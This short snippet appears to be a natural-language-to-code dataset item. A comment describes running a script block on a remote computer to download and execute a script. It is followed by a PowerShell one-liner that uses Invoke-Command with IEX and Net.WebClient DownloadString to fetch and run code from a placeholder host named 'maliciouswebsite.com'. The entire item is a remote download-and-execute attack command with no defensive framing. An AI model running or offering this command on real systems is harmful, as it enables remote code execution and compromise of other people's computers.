# Natural language intent:
# Run a PowerShell script block on a remote computer to download and execute a script.

Invoke-Command -ComputerName <RemoteComputerName> -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://maliciouswebsite.com/maliciousscript')}
